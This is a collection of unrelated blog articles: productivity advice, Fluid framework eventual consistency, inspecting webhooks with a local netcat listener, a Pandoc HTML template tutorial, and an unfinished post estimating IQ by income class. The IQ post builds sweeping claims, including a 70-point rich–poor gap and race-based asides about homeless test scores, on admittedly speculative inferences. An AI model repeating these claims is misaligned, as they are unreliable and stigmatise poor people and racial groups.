<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>What is productivity</h2>
<p>There are as many definitions for productivity, as there are productivity bloggers. I didn’t want to break a tradition, so in my understanding:</p>
<p>Productivity is simply the rate at which a task is being done.</p>
<p>If a task was done in 10 hours, then your productivity is 1 task per 10 hours. If the same task has taken you 1 hour, your productivity is now 1 task per 1 hour.</p>
<p>In both cases, we still use the word productivity as it simply states the rate of work being done. </p>
<p>There are 2 more words that go hand in hand with productivity. In the second case, when you only spent 1 hour instead of the usual 10, you got more <strong>productive</strong>. Also, <strong>efficiency</strong> per time invested has improved.</p>
<p><strong>Efficiency</strong> is a tricky term. To understand the word efficiency correctly, you need to specify the task and what inputs are being taken to complete this task. <strong>Efficiency</strong> always has something related to it. In our example above, it was the time that you have gotten more efficient with.</p>
<p>If we are talking about a company, then your <strong>productivity</strong> would be the rate at which a product is being manufactured. While improving the output would make your company more <strong>productive</strong> and improve <strong>efficiency</strong> based on the time spent per product.</p>
<p><strong>Labor productivity</strong> is a hot term right now for CEOs of big companies. Labour productivity is just the amount of goods or service a total of your workforce(or labour force) produce in a given period of time. This is exactly the same thing. It is the <strong>productive</strong> rate of work.</p>
<h2>What does it mean for you?</h2>
<p>As humans, we always tend to choose the paths of least resistance. Sometimes it is crossing the road without the pedestrian crossing. Sometimes it is using the already known but outdated method of solving a problem.</p>
<p>Productivity, as a buzz word, that has been thrown around the internet a bunch. But the bottom line is that it can be improved and should be improved in everyday tasks.</p>
<p>What is better, solving a problem in 5 hours right now, or spending 1 hour on research and completing all of the future problems that are similar in 1 hour? Most of the people would irrationally choose the option of doing a task now, for 5 hours. </p>
<p>Process of <strong>learning</strong> has always been <a href="https://journals.plos.org/plosbiology/article?id=10.1371/journal.pbio.0040233">the most painful process for most of us.</a> That is why our body and brain try to stay away from learning as much as possible.</p>
<p>The bad news here is that if you want to improve your productivity, you have to start learning every day and in every aspect of your life. Improving productivity can work wonders, but you have to put some amount of work to learn what to improve and how to improve.</p>
<p>The main problem is that increase in productivity has a marginal diminishing returns to time spent on it. Which means that with each increment of time you put in, less you will improve your productivity. It is effortless to increase your productivity 2x, but after that increasing, it 2x again can take twice as long.</p>
<p><img alt="image of start vs perfect visualisation" src="https://i.gyazo.com/a2a2c66c60c6b53a14b22a40908f3230.png"></p>
<p>That means that those that put out steps to improve your productivity and your work x10 straight away, make the process of learning as easy as possible. This reduces the time needed to learn, which in turn makes sure that you will stick with the hole task of improving.</p>
<p>Why are courses such a huge part of our lives? There are productivity courses on hard skills(productivity, design and marketing) everywhere right now. But now even soft skills(public speaking, presenting, communicating and thinking) courses are just as relevant.</p>
<p>With the time of google and <a href="https://klimy.co/blog/how-to-succeed-in-life-online-in-2020">information overdose</a>, it is tough to have a clear picture of topics. Those that make a clear picture for you and organise the best content in a very easy to consume way are rewarded with dollars.</p>
<p>That is why some of the professional productivity courses can be very expensive.</p>
<h2>Professional and work-life</h2>
<p>Some of the courses in professional space can cost huge sums. Some of them are as expensive as 100$ thousand. You probably don’t want to spend that much money on a course or an MBA program yourself. That is when your communication skills with your boss come into play.</p>
<p>Improving your productivity is not something that only will improve your personal life. Productivity will improve your professional life, as well. </p>
<p>Imagine a scenario:</p>
<p>Your boss can hire 2 new employees, that are at the middle level of skills, and spend $100 thousand per year on salary.</p>
<p><img alt="2 middle employees with $50k salary each" src="https://i.gyazo.com/2a818faa8eb3453790f1b1a795651ffd.png"></p>
<p>Or he can hire you and pay you $60 thousand in salary but also buy courses for $20 thousand that you will have to understand fully. </p>
<p>Let’s think that these courses will improve your productivity at work-related tasks x4. Now the employer has spent 80$ thousand, and you can do as much work as 4 other employees. Basically, you are saving an employer $120 thousand.</p>
<p><img alt="1 senior supper employee with 60 + 20 thousand dollars" src="https://i.gyazo.com/ddedad6f922bc9661accb5a238bf2639.png"></p>
<p>This is a very common thing that employers consider when hiring. If you show passion for learning and willing to improve and take critique on the interview, that shows that you are the type of person that can be invested in.</p>
<p>There is research that shows that some of the bootcamps for professionals can improve productivity at specific task x25. That is why x4 is not an exaggeration. Knowledge is power. It was, and it always will be.</p>
<p>This is just a simple case that can be done on a big scale, but think of countless udemy courses that for $10 can make an oblivious junior engineer into a decent high-end junior? Knowing from personal experience, that $10 can save you 100 hours for your senior engineer and the junior will have a good base to understand how to carry forward.</p>
<h2>Improving Productivity is easy</h2>
<p>If I asked — how much free time do you have? Most people would say no free time. I get it we all are busy bees.</p>
<p>But I bet you have 5 minutes per day of free time. I even bet that you have more, but 5 minutes will do for now.</p>
<p>What you need to do is to choose 5 minutes that will be free for you every single day, 365 days a year. Do you have a time slot chosen? Okay.</p>
<p>So now, I want you to spend this 5 minutes every day working on your productivity. Buy a course for your work for $10 on udemy, download YouTube tutorials relevant to you. I want you to spend those 5 minutes learning on how to improve.</p>
<p>If after 5 minutes you want to carry on for a bit, sweet. If no, then just stop after 5 minutes and carry on with your day. Make sure, though, to do this <strong>every, single, day.</strong></p>
<p>Why? Let’s do some maths:</p>
<p>5 X 365 = 1825 minutes or 30.5 hours that you spent learning. I would gladly take out 5 minutes from my day for 30.5 hours of improvement in a year.</p>
<p>It is all in compounding. Just getting better for a little bit will make all your life easier. Getting better for a little bit but in the long period of time, constantly, will change your life entirely. </p>
<p>If you improve your productivity by 1% each day, then at the end of the year( 1.01^365 ) you will be 37.8 times better then when you started.</p>
<p>This whole learning and productivity processes are what actually differentiates the average from the great.</p>
<p>For freelancers, it is what separates the $5 an hour and $500 an hour professionals.</p>
<p>A person can finish 10 projects and earn a $1000 or can do 1 project and get $10000. That is also an example of efficiency that has gotten improved.</p>
<p>If you don’t improve your productivity, <a href="https://klimy.co/blog/the-world-doesnt-stop-when-you-are-tired">someone else there will</a> and will most likely drive you out of your comfortable life.</p>
<h2>Final thoughts</h2>
<p><strong>Productivity</strong> is a buzz word everyone throws around. Next time when you are doing anything, think of a word <strong>improvement.</strong> As long as you <strong>improve</strong>, it doesn’t matter what you are doing and how.</p>
<p>You as always have to start small to get somewhere big. It is all in the process. Get so comfortable with the process, <a href="https://jamesclear.com/in-love-with-boredom">that without it, you will be bored.</a></p>
<p>You want to become a person that is a constant learner, and that is efficient in everything. Only then you can guarantee success.</p>
<p>Start now. Get perfect later.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			

<h2 id="the-collaboration-problem-overwriting-each-other-changes">The collaboration problem: overwriting each other changes</h2>

<p><img src="https://d33wubrfki0l68.cloudfront.net/858fc86df4e90dc814f90527bbcf13bbf2bffc87/f1ba3/images/eventual-consistency/rest-overwriting.svg" alt=""></p>

<p>In traditional online applications, when you make a modification to the state of the object you work on, the change propagates to a central server that holds the “truth”. The server registers the change and sends back a confirmation that the change was indeed applied.</p>

<p>The problem happens when Alice and Bob <strong>try to update the same database field at the same time</strong>. At this point, there will be a <strong>data race</strong> and whichever request gets to the database <strong>last, will “win”, the other will be discarded</strong>.  That’s quite a jarring experience especially because round-trip latency of up to a second aren’t unusual (especially on mobile), so Alice might have moved on thinking their change applied, only to realize later on that it was overwritten. This is quite regrettable especially since those two updates aren’t technically conflicting, they are modifying different parts of the same string.</p>

<blockquote>
<p>This traditional approach wasn’t designed with real time collaboration in mind and it naturally induces latency and flow challenges, making the collaboration experience worse.</p>
</blockquote>

<p>One way to work around the latency and some of the conflict resolutions challenges is to <strong>pretend that we don’t need to talk to a server and that all changes are local</strong>. This is the approach the <a href="https://fluidframework.com/">Fluid framework</a> chose.  Fluid still needs to <strong>eventually have all collaborators agree on the current state of our object(s) and has to avoid all conflicts</strong>. For that, it relies on <strong>eventual consistency provided by distributed data structures</strong>.</p>

<p><a href="https://fluidframework.com/">Fluid</a> abstracts the networking and backend layers so developers can focus on building an user experience by only thinking “local”. There isn’t a centralized canonical data truth to check against anymore, instead all connected users have the data locally and all these users always eventually end up with the exact same data. This “local” approach allows for a zero latency experience while keeping data consistent.</p>

<h2 id="eventual-consistency-using-special-data-structures">Eventual consistency using special data structures</h2>

<h3 id="example-alice-and-bob-are-co-editing-a-document-at-the-same-time">Example: Alice and Bob are co-editing a document at the same time</h3>

<p><strong>Alice and Bob both load a Fluidified application</strong>. The User Interface uses <strong>Fluid to load and manage the state</strong> of its underlying data. The application <strong>page has a title</strong> for which the initial state is loaded by <a href="https://fluidframework.com/">Fluid</a> from a server, the title reads “hello world!”</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/5fe96cbfaf69cfa676bb9b7eaad3a3567a7cd8ca/da45e/images/eventual-consistency/fluidified-string.svg" alt="Fluid setup"></p>

<hr>

<p><strong>Alice edits the title</strong> so it reads “hello Alice!”, the change is applied right away to the data structure representing the title and an operation representing the change is sent to the <a href="https://fluidframework.com/">Fluid server</a> to propagate to all connected collaborators.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b767c84c311440c217f1ee607144f249ee118399/02453/images/eventual-consistency/alice-change.svg" alt="Alice edits the title"></p>

<p>A new operation is sent to the <a href="https://fluidframework.com/">Fluid server</a>:
<code>Replace characters at position 6, new content: "Alice"</code></p>

<hr>

<p><strong>At the very same time, Bob edits the title too</strong>. He injects an upside down exclamation mark so the title reads “¡hello world!”. The change is reflected right away on Bob’s screen and an operation is sent to the <a href="https://fluidframework.com/">Fluid server</a> to propagate to the connected collaborators.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7079e0ad9d69c2b95d95fea5f55f7867e47c47f2/dd2d7/images/eventual-consistency/bob-change.svg" alt="Bob edits the same title"></p>

<p>A new operation is sent to the <a href="https://fluidframework.com/">Fluid server</a>:
<code>Insert character at position 0, new content: "¡"</code></p>

<hr>

<p>Even though Alice and Bob edited the same text at the same time, both saw their change being <strong>applied right away</strong> and then saw their <strong>collaborator changes being applied without any conflicts</strong>. They <strong>eventually</strong> both see the same <strong>consistent title</strong>.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7ba2a7567e7a8078008068aed0a40a51b330d660/dabe2/images/eventual-consistency/final-string.svg" alt="Final string"></p>

<hr>

<h2 id="summary">Summary</h2>

<p>By breaking down content into <strong>smart linked structures that know how to deal with granular changes</strong>, and can handle potential conflicts on each user’s device, users never wait for anything to happen and therefore feel like there isn’t any latency . Those <strong>smart structures are referred as Distributed Data Structures</strong> (DDSes) in <a href="https://fluidframework.com/">Fluid</a> parlance and are the key to making Fluid feel real time. <strong>Fluid offers various DDSes</strong> to cover the diverse needs of developers besides working on a collaborative text. Most DDSes link one to one to known structures such as strings, maps or linked lists. <strong>Developers can focus solely on the creation of amazing User Experiences and data modeling</strong>, <em>the underlying concerns such as connectivity, data transfer and applying of operations and conflict resolutions are handled by the framework</em>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure id="w-node-184f6be698e4-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc36150f7e15501838a699f_3C877AnDdlSJbqfxjZakSrkuQ6NuM0CNdqLoQvUNkeH3u3ScA-BmwT0Qbkb0NsFSDoElP6iR-iS4zhQ-QNa_cEMzBQ0XbHk6xsMTaU1EypUH-XFO7m_sywyykBR2iA_6wc4QMQHL.png" alt=""></p></figure><p>A very common challenge faced by many software products is the need for the application server to communicate with other third party application servers. To be more specific, my application server needs to be notified when a particular event takes place in a 3rd party application server.<br></p><p>For instance, I am currently building a <a href="https://www.delightchat.io/" target="_blank">customer support software</a> in which customer queries can come from various channels of communication including Facebook, Instagram and WhatsApp. This means that if someone sends a message on Facebook messenger, that message has to ultimately reach my application server in some way so I can perform the necessary operations.<br></p><p>The most common way to solve this problem is with the use of webhooks.<br></p><h3><strong>What is a webhook?</strong><br></h3><p>A webhook is nothing but an API end point that is created in your own application server which is made public and it is called by other applications to provide your application with real time updates for various events.<br></p><p>The product that I am currently building integrates with Shopify and every time somebody places an order on a merchants Shopify store, my application needs to be notified in real time so that the order can be indexed in my database and my application then has the capability to query all orders placed by a particular user.<br></p><p>To solve this, I would have to create an API end point on my server in the form of <em>/webhooks/shopify/orders/create</em> and register this URL with Shopify. Whenever Shopify receives a new order in their system, their server will fire this URL along with the order data.<br></p><h3><strong>How to inspect a webhook?</strong><br></h3><p>Since a webhook is called from a 3rd party server that is out of your control, you have no way of knowing what kind of data will be sent in the webhook unless you actually create an API, host it somewhere that is public and register the endpoint with the 3rd party software. <br></p><p>If this seems like a lot of work just to view the contents of a webhook, products like <a href="https://requestbin.com/" target="_blank">requestbin</a> and <a href="https://beeceptor.com/" target="_blank">beecepter</a> were built exactly for this purpose. You can get a free endpoint from these products and register it in the 3rd party software after which you can trigger the event you are looking for and view the contents of the request on their dashboard.<br></p><p>However I believe in simplicity and these services come with their own set of constraints. So after a little bit of research I found that the netcat utility that is installed by default In most UNIX based machines solves this problem quite elegantly.<br></p><h5>Using netcat to inspect a webhook<br></h5><p>In the most simplest form, you can set up a webhook listener with a simple terminal command<br></p><p>&lt;p&gt;CODE:&nbsp;https://gist.github.com/sankalpjonn/b0a8efaad418feeae02e4285582e2ce5.js&lt;/p&gt;<br></p><p>This command will listen for any requests coming on the port 3000 and display it on the terminal itself. Let us try it out by entering <a href="http://localhost:8000/my/webhook/path" target="_blank">http://localhost:3000/my/webhook/path</a> on the browser and see what happens.<br></p><figure id="w-node-060a8fc15179-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc34225f58539412e8fad89_gN3PHr5rIsoV-eU02OEnVfFRqw10WcvJV73B2eTxDnL1IanCGiOyMGuomBwxTo7LJV2QmqfyFgSYRT5cNlIIK-YsdFC3Pt8k4U_vmrVt65rlvqVDok1o44yR-_rKqVr0YGLXKV8U.png" alt=""></p><figcaption>Inspecting the contents of a http request<br></figcaption></figure><p>The output on the terminal contains the entire http request that was received by localhost:3000 including the http method, headers and content. But there are two clear problems here:<br></p><ul role="list"><li>The browser keeps waiting for a response from the netcat server which is never received, so it eventually times out.</li><li>The netcat server displays the webhook request and then shuts down after which it will no longer accept any more requests unless you re-run the command.<br></li></ul><p>Both of these problems have simple solutions. Let’s go through them in order.<br></p><h5><strong>Returning a response</strong> <br></h5><p>One can easily create a simple HTTP message and return that as the response to the requests made to this netcat server. Here is how you do it:<br></p><p>Create a file called response.txt with these contents.<br></p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/0753a1ac3a4442eedb3c0f811740e4ec.js &lt;/p&gt;<br></p><p>Echo the contents of this file and pipe the netcat command to it.<br></p><p>&lt;p&gt; CODE:&nbsp;https://gist.github.com/sankalpjonn/5fffa3d857bab441dd85fad1061da384.js &lt;/p&gt;<br></p><p>Now upon hitting localhost:3000 on your browser, you will receive a response in the browser.</p><figure id="w-node-7c8443ed0138-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5fc342e7f19477bb7649ae48_Wxi5VFUp0fleE1u1NrVneah1s_TxVNEXXKaXw092dB-lfc3M7ljNOgoTIp0uvn8WiEZT071uf0P4vNbTQcrknLXckCJGsShTHzmMEoxUJ39O9rvCIfqbbUDtXnBSH67vAy2-X6wv.png" alt=""></p><figcaption>netcat server with response</figcaption></figure><p>‍</p><h5>Running the netcat server in a loop<br></h5><p>To prevent the netcat server from shutting down after a request is received, all we have to do is run the commands in a loop.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <time datetime="2020-11-29">November 29, 2020</time>
<p>In this post I’ll describe how to use <a href="">Pandoc</a> to convert Markdown to a full HTML page (including header/footer).</p>
<p>The Pandoc version used for the examples below is 2.11.2.</p>
<h2 id="what-is-pandoc">What is Pandoc?</h2>
<p>Pandoc is an open-source document converter that is written in Haskell. It was initially released in 2006 and has been under active development since then.</p>
<p>The goal of Pandoc is to convert a document from one markup format to another. It distinguishes between input formats and output formats. As of writing this it supports <a href="https://pandoc.org/MANUAL.html#input-formats">38 input formats</a> and <a href="https://pandoc.org/MANUAL.html#output-formats">59 output formats</a>.</p>
<p>In this post we’ll use Markdown as an input format and HTML as an output format.</p>
<h2 id="preparing-the-html-template">Preparing the HTML template</h2>
<p>To generate a full HTML page we have to use Pandoc’s standalone mode which will use a <a href="https://pandoc.org/MANUAL.html#templates">template</a> to add header and footer.</p>
<p>Pandoc ships with a default template, if you wish to use that skip this section and omit the <code>--template</code> argument.</p>
<p>The template we’ll use is this (save it to <code>template.html</code>):</p>
<pre><code>&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta name="date" content='$date-meta$'&gt;
    &lt;title&gt;$title$&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;p&gt;Date: $date$&lt;/p&gt;
$body$
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>Pandoc’s template variables can have <a href="https://pandoc.org/MANUAL.html#interpolated-variables">different formats</a>, the one we’re using here start and end with a dollar sign:</p>
<ul>
<li><code>$date$</code>: A date in a parsable format. See the <a href="https://pandoc.org/MANUAL.html#variables-set-automatically">date-meta docs</a> for a list of recognized formats for the <code>date</code> variable. We use this to show when the document was created</li>
<li><code>$date-meta$</code>: The <code>date</code> parsed to ISO 8601 format. This is automatically done</li>
<li><code>$title$</code>: The document title</li>
<li><code>$body$</code>: The document body in HTML (the converted Markdown)</li>
</ul>
<p>We only need to set the <code>date</code> and <code>title</code> in the Markdown document via a metadata block.</p>
<h2 id="writing-the-markdown-file">Writing the Markdown file</h2>
<p>Create a Markdown file <code>doc.md</code> with the following content:</p>
<pre><code>---
title: My Document
date: September 22, 2020
---

## Test
some text</code></pre>
<p>The beginning of the document is the metadata block with required <code>date</code> and <code>title</code> variables mentioned above.</p>
<p>Several Markdown variants are <a href="https://pandoc.org/MANUAL.html#Markdown-variants">supported</a> such as GitHub-Flavored markdown. This example uses <a href="https://pandoc.org/MANUAL.html#pandocs-markdown">Pandoc’s extended markdown</a> which is the default input for files with the <code>md</code> extension.</p>
<h2 id="converting-the-document">Converting the document</h2>
<p>Run the following command to generate the HTML page:</p>
<pre><code>pandoc --standalone --template template.html doc.md</code></pre>
<p>Pandoc will try to guess the input format from the file extension (<code>.md</code> will use the Markdown input format) and output it to HTML (the default output format).</p>
<p>The output will be printed to the terminal:</p>
<pre><code>&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta name="date" content='2020-09-22'&gt;
    &lt;title&gt;My Document&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;p&gt;Date: September 22, 2020&lt;/p&gt;
&lt;h2 id="test"&gt;Test&lt;/h2&gt;
&lt;p&gt;some text&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>To save the document to a file we can either redirect stdout or use the <code>-o</code> argument:</p>
<pre><code>pandoc --standalone --template template.html doc.md -o doc.html</code></pre>
<h2 id="conclusion">Conclusion</h2>
<p>In this example we’ve converted Markdown to a standalone HTML page that is using a custom template.</p>
<p>This was just a simple example of what Pandoc is capable to do. The standalone mode coupled with the bundled default templates makes it easy to generate a wide variety of outputs such as HTML presentations, Jupyter notebooks or PDF documents.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>
			<p>In this post, I summarize all that I have learned about the actual test scores&nbsp;of different income levels. &nbsp;In particular, I compare actual psychometric data of seven U.S. economic classes: (1) the homeless, (2) welfare recipients, (3) median Americans, (4) self-made millionaires&nbsp;(5) self-made decamillionaires, (6) self-made billionaires, and (7) self-made decabillionaires, and largely confirm my repeated assertion that average IQ increases by 8-10 points for every ten-fold increase in income, though there may be a few major exceptions to this overall trend. &nbsp;Also, by analyzing the slope of the standardized regression line predicting IQ from income, I find evidence that the true correlation between IQ and income (at least in America) is much higher than the 0.23 &nbsp;reported in a&nbsp;<a href="http://www.emilkirkegaard.dk/en/wp-content/uploads/Intelligence-and-socioeconomic-success-A-meta-analytic-review-of-longitudinal-research.pdf">2006 meta-analysis</a>&nbsp;and even higher than the 0.4 correlation asserted by Arthur Jensen, and may even approach 0.5.</p>
<p>I also find tentative but shocking evidence that the IQ gap between the richest and poorest Americans may exceed an astonishing 70 points!</p>
<p>In this analysis I am limiting myself entirely to test score data so IQ estimates based on <a href="https://pumpkinperson.com/2015/07/26/if-billionaires-the-homeless-took-the-worlds-most-racist-iq-test/">ethnic composition</a> or <a href="https://www.psychologytoday.com/files/attachments/56143/wai-americas-elite-2013.pdf">educational achievements</a> of various economic classes are only occasionally mentioned to buttress the actual psychometric results. &nbsp;In several cases, the data is somewhat anecdotal, and speculative statistical inferences are sometimes made.</p>
<p><strong>Technical note</strong></p>
<p>For each economic class, I provide two normalized <a href="https://pumpkinperson.com/2015/09/30/what-is-a-z-score-a-definition-2/">Z scores</a>; one measuring the median financial success, and one measuring the mean or median cognitive ability. &nbsp;The normalized Z scores are just measures of where each economic class ranks (in financial success or IQ) compared to a reference group (in this case U.S. adults in general, or U.S. adults of a specific age). &nbsp;For example a Z of +2.33 means you’re in the top 1%, and a Z of -2.33 means you’re in the bottom 1%. &nbsp;A Z of 0 means you’re right in the middle, etc.</p>


<p><strong>Median financial success: 0.09 percentile of U.S. adults (normalized Z = -3.13)</strong></p>
<p><span>In 2015, <a href="http://www.reuters.com/article/us-usa-homelessness-idUSKCN0T908720151120">roughly 423,750</a> American adults were homeless on a given night: One in 572 American adults (0.17%). &nbsp;Thus it can be estimated that the median homeless person is financially in the bottom 0.09%</span></p>
<p><span>&nbsp;</span><strong>Median cognitive ability: 12.8 percentile of U.S. adults (normalized Z = -1.17)</strong></p>
<p>A <a href="http://epublications.marquette.edu/cgi/viewcontent.cgi?article=1104&amp;context=edu_fac">2004 study</a> found that 90 homeless men living in a large shelter in Milwaukee, Wisconsin, had a mean <a href="http://www.pearsonclinical.com/education/products/100000593/wechsler-abbreviated-scale-of-intelligence-wasi.html">WASI</a> full-scale IQ of 83.92 (<a href="https://pumpkinperson.com/2015/09/23/what-is-a-standard-deviation-a-definition/">standard deviation</a> = 15.24). &nbsp;The WASI was published in 1999, and this study was published in 2004, so we should subtract 1.5 points for old norms which are thought to expire at a rate of 0.3 points a year (the Flynn effect), so the homeless likely have a mean IQ of 82.5 (U.S. norms) or about 80 (U.S. <a href="https://pumpkinperson.com/2015/04/20/the-use-of-white-norms-when-calculating-iq-greenwich-scale/">white norms</a>).</p>
<p>One problem with this study is that 81% of the sample was black (much higher than the 45% among homeless Americans in general) and these tend to score lower on IQ tests, at least in the general population, however a UK sample of homeless obtained virtually identical scores on the WASI, despite being 96% white.</p>
<p>In the &nbsp;UK<a href="http://www.academia.edu/1512384/Neuropsychological_and_cognitive_performance_of_homeless_adults">&nbsp;study</a>,&nbsp;the WASI full-scale IQ distribution of the homeless has a mean of 84.3. In this study, published in 2011, the WASI norms were by now even more outdated, so we should probably subtract 3.6 points for old norms, so this homeless sample have a mean IQ of 80.7 (U.S. norms) or about 78 (U.S. white norms).</p>
<p>Given the IQ of 80.7 (U.S. norms) among the the virtually all-white U.K. homeless sample, the IQ of 82.5 among the mostly blacks American sample is unlikely to be deflated by race, thus 83 is considered the best estimate of the American homeless.</p>


<p><strong>Median financial success: 8.5 percentile of U.S. adults (normalized Z = -1.4)</strong></p>
<p><span><a href="http://www.cheatsheet.com/personal-finance/whos-on-welfare-9-shocking-stats-about-public-assistance.html/?a=viewall">About 17%</a> of U.S. adults between age 18 and 64 receive public assistance. &nbsp;Thus the <em>median</em> welfare recipient can be thought of as in the bottom 8.5% financially.</span></p>
<p><strong>Mean cognitive ability: 30 percentile of U.S. adults (normalized Z = -0.53)</strong></p>
<p>It’s common knowledge in psychometric circles that reading comprehension tests are statistically equivalent to&nbsp;IQ tests, and a <a href="http://literacy.kent.edu/Oasis/Pubs/0700-8.pdf">literacy study</a> found that about 2/3 to 3/4 of adult welfare recipients (about 71%) have what’s classified as Level 1 or Level 2 literacy. &nbsp;By contrast, 1/2 of the general adult population are at these levels.</p>
<p>Since by definition, 1/2 of Americans have IQs below 100, it can be deduced that 71% of welfare recipients have IQs below 100. &nbsp;In a normal distribution, the 71 percentile is 8 IQ points (0.53 sigma) above the mean, so if IQ 100 is the 71 percentile among welfare recipients, the average welfare recipient should have an IQ 8 points less.</p>
<p>In other words, American welfare recipients average IQ 92 (U.S. norms) or about 90 (U.S. white norms).</p>
<p>Some might object that my analysis falsely assumes welfare recipients have the same IQ variance as the general U.S. population, but the above cited studies of the homeless suggest that poor Americans do indeed have a similar variance to Americans on the whole.</p>

<p><strong>Median financial success: 99th percentile&nbsp;of Americans&nbsp;in their 50s (normalized Z = +2.33)</strong></p>
<p>According to the 2000 book <a href="http://www.amazon.com/gp/product/0740718584?ie=UTF8&amp;tag=thecalicocat-20&amp;linkCode=as2&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0740718584">The Millionaire Mind</a> by Thomas J. Stanley, which reported on a survey of 773 &nbsp;millionaires (defined here by household, not individual net-worth), the typical self-made millionaire is a 54 year-old man. &nbsp;In the year 1998&nbsp;(when the millionaires were surveyed), it took an individual income of <a href="http://www.theatlantic.com/business/archive/2014/10/the-top-1-percentand-01-percentof-every-age-group-in-america/382094/">about $340,000</a>&nbsp;to make the top 1% for 52-58-year-olds. &nbsp;The surveyed millionaires had a median income of $436,000, but because this was household income, their spouses likely contributed, so in individual income they were likely not much higher than the top 1%</p>
<p><strong>Mean cognitive ability: 88th percentile&nbsp;of U.S. adults (normalized Z = +1.2)</strong></p>
<p>The average self-reported SAT score of the millionaires Stanley survey was 1190, which Stanley adjusted to about 1100 because of self-reporting bias (millionaires who were “A students” were more likely to recall their scores than “C students”). &nbsp;Since 90% of the sample were college graduates it’s likely virtually all took the SAT.</p>
<p>Since the typical self-made millionaire in the sample was 54 as of 1998, it’s likely he took the SAT circa 1961 (when he was 17). &nbsp;According to the book <em>The Bell Curve</em> (page 422), if all American young adults (not just the college bound elite) had taken the SAT in 1960, the average score (IQ 100; U.S. norms) would have been 784. &nbsp;Meanwhile prior to 1974, an SAT score of 1300 <a href="http://www.us.mensa.org/join/testscores/qualifyingscores/">was considered</a> Mensa level (IQ 130). &nbsp;Extrapolating from these two data points, the average self-made millionaire has an IQ of 118 (U.S. norms); 117 (U.S. white norms).</p>

<p><strong>Median financial status: 99.9th percentile&nbsp;of Americans&nbsp;in their 50s (normalized Z = +3.1)</strong></p>
<p>20% of Stanley’s millionaire sample earned at least $1 million a year in household income, and many of these probably earned much more than that, and presumably the bulk of this was individual income made by&nbsp;by the head of households Stanley surveyed, not their spouses. &nbsp;Anyone in their 50s who has been earning a million a year for a long period of time, likely has, or will have, a net worth over $10 million (decamillionaire status). &nbsp;In the year 1998&nbsp;(when the millionaires were surveyed), it took an individual income of <a href="http://www.theatlantic.com/business/archive/2014/10/the-top-1-percentand-01-percentof-every-age-group-in-america/382094/">about $1.25 million</a>&nbsp;to make the top 0.1% for 52-58-year-olds.</p>
<p><strong>Mean cognitive ability: 88th percentile&nbsp;of U.S. adults (normalized Z = +1.2)</strong></p>
<p>Above I noted that millionaires had a mean SAT score equating to IQ 118 (U.S. norms); 117 (U.S. white norms). &nbsp;Because Stanley found virtually no correlation between income or net-worth among the millionaires themselves it might be assumed that the decamillionaires in his sample also averaged IQ 118. &nbsp;Of course if the data was not normalized, the zero correlation might be misleading.</p>


<p><strong>Median financial success: 99.99993 percentile for&nbsp;baby boomers&nbsp;(normalized Z = +4.8)</strong></p>
<p>About <a href="http://www.bloomberg.com/bw/articles/2014-11-20/silent-generation-born-amid-depression-found-prosperity">80 million Americans</a> were born between 1946 and 1964 (the baby boomers). &nbsp;People in this age groups <a href="http://blog.aarp.org/2013/09/17/the-forbes-400-americas-richest-by-generation/">are about 42%</a>&nbsp;of the richest Americans. &nbsp; There are 277 self-made billionaires in America (see appendix A of <a href="https://www.psychologytoday.com/files/attachments/56143/wai-the-global-elite-in-press.pdf">this document</a>). &nbsp;If we assume 42% of these are boomers, then 116 of America’s 80 million boomers are self-made billionaires, which means the median self-made billionaire boomer is the 58th most prosperous out of 80 million, equating to the 99.99993 percentile.</p>
<p><strong>Mean cognitive ability: 98.6 percentile of U.S. adults (normalized Z = +2.2)</strong></p>
<p>Several boomer billionaires have SAT scores that are apparently publicly known. &nbsp;Bill Gates <a href="https://pumpkinperson.com/2014/10/13/high-iq-bill-gates-towers-as-the-richest-american-21-years-in-a-row/">claims&nbsp;to</a> have scored 1590 and Paul Allen <a href="https://books.google.ca/books?id=7J_EBQuPxAgC&amp;pg=PA13&amp;lpg=PA13&amp;dq=paul+allen+sat+score+1600&amp;source=bl&amp;ots=84c18D89pV&amp;sig=Zp0R2cz10H90fOi-YWNNLYtbhvs&amp;hl=en&amp;sa=X&amp;ved=0ahUKEwirn7aeiurKAhWmnYMKHZWQA4k4ChDoAQhTMAk#v=onepage&amp;q=paul%20allen%20sat%20score%201600&amp;f=false">reportedly&nbsp;scored</a> 1600. &nbsp;On the pre-1995 SAT, these <a href="https://pumpkinperson.com/2015/12/16/revised-chart-converting-sat-scores-to-iq-equivalents/">scores equate</a> to IQs of about 170. &nbsp;I can no longer find any internet sources reporting Steve Ballmer’s composite SAT scores,&nbsp;&nbsp;but he reportedly scored a <a href="http://time.com/2796391/steve-ballmer-los-angeles-clippers-new-owner/">perfect 800</a> on the math section of the SAT which seems to equate to an IQ of 150, but given that he hit the ceiling on the test, and is <a href="http://www.forbes.com/forbes/1997/1013/6008040a.html">rumored to be</a> in the same IQ league as Gates himself, this is likely an underestimate. &nbsp;Perhaps the best publicly known measure of his IQ is his performance on William Lowell Putnam Mathematical Competition where he performed even <a href="http://William Lowell Putnam Mathematical Competition">better than Gates</a>. &nbsp;If <a 